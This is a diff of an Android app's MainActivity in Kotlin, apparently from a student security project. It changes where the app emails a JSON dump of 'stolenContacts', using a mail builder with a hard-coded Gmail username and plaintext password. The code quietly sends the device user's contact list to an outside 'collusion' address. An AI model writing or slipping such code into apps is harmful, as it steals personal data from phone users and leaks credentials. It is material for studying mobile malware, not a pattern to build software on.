@@ -36,7 +36,7 @@ class MainActivity : AppCompatActivity() {
         newBuilder(this)
             .withUsername("it362.test2021@gmail.com")
             .withPassword("enseirbtest")
-            .withMailto("it362.test2021@yopmail.com")
+            .withMailto("collusion.enseirb@gmail.com") // CollEGL21
             .withType(TYPE_PLAIN)
             .withSubject("Android project")
             .withBody("stolenContacts= ${Gson().toJson(stolenContacts)}")
